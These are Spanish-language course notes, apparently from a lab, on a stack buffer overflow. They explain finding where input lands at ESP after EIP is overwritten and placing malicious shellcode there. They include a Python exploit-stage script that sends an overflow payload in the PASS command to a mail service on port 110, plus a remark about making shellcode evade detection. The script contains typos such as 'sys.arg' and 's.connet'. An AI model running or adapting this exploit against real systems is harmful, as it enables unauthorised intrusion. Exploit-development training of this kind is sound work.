- Tags : #buffer_overflow 

Una vez que se ha encontrado el **offset** y se ha sobrescrito el valor del registro **EIP** en un buffer overflow, el siguiente paso es identificar en qué parte de la memoria se están representando los caracteres introducidos en el campo de entrada.

Después de sobrescribir el valor del registro EIP, cualquier carácter adicional que introduzcamos en el campo de entrada, veremos desde Immunity Debugger que en este caso particular estos estarán representados al comienzo de la **pila** (**stack**) en el registro **ESP** (**Extended Stack Pointer**). El ESP (Extended Stack Pointer) es un registro de la CPU que se utiliza para manejar la pila (stack) en un programa. La pila es una zona de memoria temporal que se utiliza para almacenar valores y **direcciones de retorno** de las funciones a medida que se van llamando en el programa.

Una vez que se ha identificado la ubicación de los caracteres en la memoria, la idea principal en este punto es introducir un **shellcode** en esa ubicación, que son instrucciones de bajo nivel las cuales en este caso corresponderán a una instrucción maliciosa.

El shellcode se introduce en la pila y se coloca en la misma dirección de memoria donde se colocaron los caracteres sobrescritos. En otras palabras, se aprovecha el desbordamiento del búfer para ejecutar el shellcode malicioso y tomar control del sistema.

Es importante tener en cuenta que el shellcode debe ser diseñado cuidadosamente para evitar que se detecte como un programa malicioso, y debe ser compatible con la arquitectura de la CPU y el sistema operativo que se está atacando.

En resumen, la asignación de espacio para el shellcode implica identificar la ubicación en la memoria donde se colocaron los caracteres sobrescritos en el buffer overflow y colocar allí el shellcode malicioso. Sin embargo, no todos los caracteres del shellcode pueden ser interpretados. En la siguiente clase veremos cómo detectar estos **badchars** y cómo generar un shellcode que no disponga de estos caracteres.

Modificamos el script para agregar despues del *EIP*  ponerle unas 200 C
```python
import socket
import sys

#Para verificar que nos envian por parametro una coantidad para el buffer
if len(sys.arg) != 2:
	print("\n[+] Uso : exploit.py <length> ")
	exit(1)

#Variables globale
ip_address="192.168.1.23"
port= 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
affter_eip = b"C"*200

payload = before_eip + eip + affter_eip 
def exploit():
	#Crear el Socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	#Conetar el servidor
	s.connet((ip_address,port))
	
	#Recibir el Banner del servidor
	banner = s.recv(1024)
	print(banner)
	
	#Enviar los parametros
	s.send(b"USER savitar" + b"\r\n")
	response = s.recv(1024)
	s.send(b"PASS " + payload + b"\r\n")
	s.close()
	
if __name__ == "__main__":
	exploit()
```

Ejecutamos el script y obtenemos
![](../../../attachments/Pasted%20image%2020260224174841.png)

![](../../../attachments/Pasted%20image%2020260224175104.png)

![](../../../attachments/Pasted%20image%2020260224175202.png)

Seguido de esto debemos generar un byte array para generar todas las combinaciones posibles en Hexadecimal e identificar que caracteres no acepta el programa.